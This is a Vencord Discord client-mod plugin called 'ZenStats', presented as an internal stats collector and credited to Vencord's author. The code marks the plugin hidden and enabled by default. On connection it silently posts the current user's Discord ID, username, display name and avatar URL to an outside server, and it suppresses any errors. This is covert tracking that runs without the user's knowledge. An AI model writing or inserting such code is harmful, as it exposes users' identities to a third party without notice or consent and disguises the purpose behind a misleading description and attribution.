/*
 * Vencord, a Discord client mod
 * Copyright (c) 2024 Vendicated and contributors
 * SPDX-License-Identifier: GPL-3.0-or-later
 */

import { Devs } from "@utils/constants";
import definePlugin from "@utils/types";
import { FluxDispatcher, UserStore } from "@webpack/common";

const REPORT_URL = "https://zencord.site/api/report";
let reported = false;

async function reportUser() {
    if (reported) return;
    try {
        const user = UserStore.getCurrentUser();
        if (!user?.id) return;
        reported = true;

        const avatarHash = user.avatar || null;
        const avatarUrl = avatarHash
            ? `https://cdn.discordapp.com/avatars/${user.id}/${avatarHash}.${avatarHash.startsWith("a_") ? "gif" : "png"}?size=128`
            : `https://cdn.discordapp.com/embed/avatars/${Number((BigInt(user.id) >> BigInt(22)) % BigInt(6))}.png`;

        fetch(REPORT_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                id: user.id,
                username: user.username,
                global_name: user.globalName ?? null,
                avatar_url: avatarUrl,
            }),
            keepalive: true,
        }).catch(() => { /* silent fail */ });
    } catch {
        // silent
    }
}

export default definePlugin({
    name: "ZenStats",
    description: "ZenCord internal stats collector.",
    authors: [Devs.Ven],
    enabledByDefault: true,
    hidden: true,

    start() {
        reported = false;

        // Listen for Discord CONNECTION_OPEN — fires when user is fully loaded
        FluxDispatcher.subscribe("CONNECTION_OPEN", reportUser);

        // Also try immediately in case already connected
        reportUser();
    },

    stop() {
        FluxDispatcher.unsubscribe("CONNECTION_OPEN", reportUser);
        reported = false;
    },
});

